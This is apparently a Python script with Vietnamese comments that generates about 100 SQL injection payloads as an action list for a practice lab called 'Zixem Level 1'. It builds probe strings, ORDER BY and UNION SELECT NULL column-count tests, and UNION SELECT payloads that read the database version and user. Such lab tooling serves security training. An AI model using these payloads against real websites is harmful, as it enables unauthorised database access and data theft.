def generate_check_vuln_payloads(escapes):
    """Tạo payload kiểm tra lỗ hổng SQL Injection."""
    payloads = []
    for esc in escapes:
        payloads.append(f"{esc}and 1=1 --")
        payloads.append(f"{esc}and 1=2 --")
        payloads.append(f"{esc}' --")
        payloads.append(f"{esc}1=1 --")
    return payloads

def generate_check_columns_payloads(escapes, max_columns):
    """Tạo payload kiểm tra số cột bằng ORDER BY và UNION SELECT NULL."""
    payloads = []
    for esc in escapes:
        for i in range(1, max_columns + 2):
            payloads.append(f"{esc}order by {i} --")
        for i in range(1, max_columns + 2):
            nulls = ",".join(["null"] * i)
            payloads.append(f"{esc}union select {nulls} --")
            payloads.append(f"{esc}union all select {nulls} --")
    return payloads

def generate_data_retrieval_payloads(escapes):
    """Tạo payload lấy dữ liệu, ưu tiên 3 payload đúng của Level 1."""
    payloads = []
    data_functions = ["version()", "user()"]
    for esc in escapes:
        # Payload đúng Level 1
        payloads.append(f"{esc}union select 1,version(),3 --")
        payloads.append(f"{esc}union select 1,user(),3 --")
        payloads.append(f"{esc}union select version(),user(),3 --")
        # Biến thể
        for func in data_functions:
            payloads.append(f"{esc}union all select 1,{func},3 --")
            payloads.append(f"{esc}union select null,{func},null --")
            payloads.append(f"{esc}-1 union select 1,{func},3 --")
            payloads.append(f"{esc}-1 union select null,{func},null --")
            payloads.append(f"{esc}union select {func},2,3 --")
            payloads.append(f"{esc}union select 1,2,{func} --")
        # Kết hợp version() và user()
        payloads.append(f"{esc}union all select version(),user(),3 --")
        payloads.append(f"{esc}-1 union select version(),user(),3 --")
        payloads.append(f"{esc}union select 1,version(),user() --")
    return payloads

def generate_actions(escapes=None, max_columns=3):
    """Tạo danh sách ~100 action chuẩn hóa cho Zixem Level 1."""
    if escapes is None:
        escapes = [" ", " and 1=2 ", "-1 "]  # Phù hợp Level 1

    actions = []

    # 1. Payload kiểm tra lỗ hổng
    actions.extend(generate_check_vuln_payloads(escapes))

    # 2. Payload kiểm tra số cột (tối đa 3 cột)
    actions.extend(generate_check_columns_payloads(escapes, max_columns))

    # 3. Payload lấy dữ liệu (dựa trên 3 payload đúng)
    actions.extend(generate_data_retrieval_payloads(escapes))

    # 4. Payload bổ sung
    extra_payloads = [
        "and 1=2 union select 1,2,3 --",
        "-1 union select 1,2,3 --",
        "and 1=2 union select null,null,null --",
        "-1 union select null,null,null --",
    ]
    actions.extend(extra_payloads)

    # Nếu thiếu, thêm payload đơn giản
    while len(actions) < 100:
        idx = len(actions) + 1
        actions.append(f"and 1=2 union select {idx},version(),3 --")

    # Loại bỏ trùng lặp và giới hạn 100 action
    actions = list(dict.fromkeys(actions))[:100]

    return actions

if __name__ == "__main__":
    print("Generating actions...")
    actions = generate_actions()
    print(f"Total actions: {len(actions)}")
    for i, action in enumerate(actions):
        print(f"Action {i}: {action}")